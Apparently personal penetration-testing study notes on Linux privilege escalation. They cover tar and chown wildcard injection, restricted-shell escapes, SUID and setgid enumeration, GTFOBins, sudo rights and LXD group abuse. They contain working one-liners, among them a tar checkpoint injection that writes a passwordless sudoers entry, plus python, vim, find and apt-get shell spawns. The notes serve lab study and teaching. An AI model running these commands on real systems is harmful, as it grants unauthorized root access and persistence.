
## Wildcard Abuse 

  
  > [!note] Wildcard Abuse Summary
> In Linux, characters like *, ?, and [...] are special globbing characters used to match filenames. When a command receives a wildcard, the shell expands it into a list of matching filenames before passing them to the command.
> 
> The Attack Vector: If an attacker can create files with specific names in a directory where a privileged script or command uses a wildcard (e.g., *), they can:
> 
> 1. Inject arguments: Create a file named --checkpoint-action=exec=malicious_script so that when tar * runs, it interprets the filename as a flag.
>     
> 2. Overwrite critical files: Create a file named config.txt to overwrite an existing one if the command is cp * /backup/.
>     
> 3. Trigger unintended command execution: In some restricted environments, if a command blindly executes the expanded list, a filename starting with a dash (-) can be interpreted as an option, potentially bypassing checks or triggering help modes that leak information.
>     
> 
> ### Example: The tar Wildcard Exploit
> 
> A classic example involves the tar command. If an administrator runs tar czf backup.tar.gz * as root:
> 
> 4. An attacker creates a file named --checkpoint-action=exec=sh.
>     
> 5. They create another file named --checkpoint=1.
>     
> 6. When tar expands *, it sees these filenames as arguments.
>     
> 7. tar executes sh instead of creating a backup, effectively escaping the intended restriction.

**Wildcard Abuse** 
A wildcard injection vulnerability happens when a program uses the wildcard (*) character in an insecure way. This allows attackers to change the command’s behavior by injecting command flags. In this case, the vulnerability occurs within these lines in the script:

```
cd directory1
chown root *
```

The script goes into `directory1` and changes the owner of every file to the root user. If the directory contains the files `a.txt`, `b.txt`, and `c.txt`, the second command would expand into the following, due to the wildcard.

```
chown root a.txt b.txt c.txt
```

But the command chown has a flag called `--reference`, which tells chown to change the owner of the files to the owner of the reference file instead. So this command would change the owner of all files to the user “vickie” instead.

```
chown root a.txt b.txt c.txt --reference=file_owned_by_vickie.txt
```

So how can a hacker exploit this situation?

First, she can create a file in `directory1` using her own user account, called `file_owned_by_vickie.txt`. Then, she can create another file in `directory1` called `--reference=file_owned_by_vickie.txt`.

Finally, when the script gets executed, the wildcard will notice that the directory contains five files: `a.txt`, `b.txt`, `c.txt`, `--reference=file_owned_by_vickie.txt` and `file_owned_by_vickie.txt`. It will expand the command into this one:

```
chown root a.txt b.txt c.txt --reference=file_owned_by_vickie.txt file_owned_by_vickie.txt
```

Our `--reference` flag was injected and thus, the owner of the `file_owned_by_vickie.txt` file now owns all files in `directory1`.
  

|                                                                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh  <br>echo "" > "--checkpoint-action=exec=sh root.sh"  <br>echo "" > --checkpoint=1 |

## Restricted Shell 

[resource 1](https://github.com/The-Red-Serpent/restricted-shell-escape-cheatsheet) | [resource 2](https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e) | [resource3](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)

|                                                                     |
| ------------------------------------------------------------------- |
| :!/bin/ls -l .b*  <br>:set shell=/bin/sh  <br>:shell  <br>!'/bin/sh |

**Pager Commands**
- Commands like more and less
- Open file long enough to fit on more than one screen and type !’sh’ inside at the bottom 
    
**Man and pinfo commands**
- pinfo ls
- Enter command ls /etc 
    

**Restricted Shell Checklist** 

```

#EDITORS --------------------

ed 

- if ed works, try 
    
- !’/bin/sh’
    

find / -perm -u=s -type f 2>/dev/null

vim 

- if vim works, try 
    
- :!/bin/ls -l .b*
    

  

#PAGER COMMANDS -------------

- Open file that takes up more than a page 
    
- Type !’sh’ inside it 
    
- Type less .bashrc 
    
- Type more .bashrc
    

  

man ls 

pinfo ls 

After entering pinfo menu, type [!]

  

#Check languages

python -c 'import os; os.system("/bin/sh")'  
  

python -c 'import pty; pty.spawn("/bin/bash")'

  

# OPERATORS -----------------------------

nano new-file   
  

cat existing file > new-file 

cat existing file | grep “” 

cat existing file >> new-file

  
  

/bin/bash  
  

/bin/sh  
  

cp /bin/bash ~/sh  
  

man nmap  
  

!/bin/bash  
  

find / -name test -exec /bin/bash \;  
  

tar cf /dev/null testfile -checkpoint=1 -checkpoint-action=exec=/bin/bash

  

ssh hackNos@<IP-Adress> -t "bash --noprofile"```                                                                          

```
## Set UID/SUID Permissions 

[resource-1](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) 
[resource-2](https://www.youtube.com/watch?v=718L9YuRUTY)
**Setuid:** permission found in linux that allows a user to execute script or action with the permissions of a user
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
**setgid:** Permission that lets us run binaries as if we were part of the group that created them. files can be enumerated using following command 
```bash
find / -uid 0 -perm -6000 -type f 2>/dev/null
```


**GTFO Bins**
== write about what gtfo bins do==
[GTFO Bins](https://gtfobins.org/)
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Sudo Rights Abuse 

```bash
sudo -l 
```

## Privileged Groups 

[resource1](https://github.com/initstring/lxd_root/blob/master/lxd_rootv1.sh) 

[resource2](https://0toroot.com/learn/linux-privesc/lxd-lxc-privesc) 

[lxd-automation-script](https://github.com/M4rc0HR/lxd-privesc)

**LXD:** Similar to docker, ubuntu’s container manager 
- Can be abused to create file, browse mounted host and gain access to password hashes or SSH keys
- placing user in docker group is equivalent to root level access without password 
- To exploit, must have lxd or lxc group 
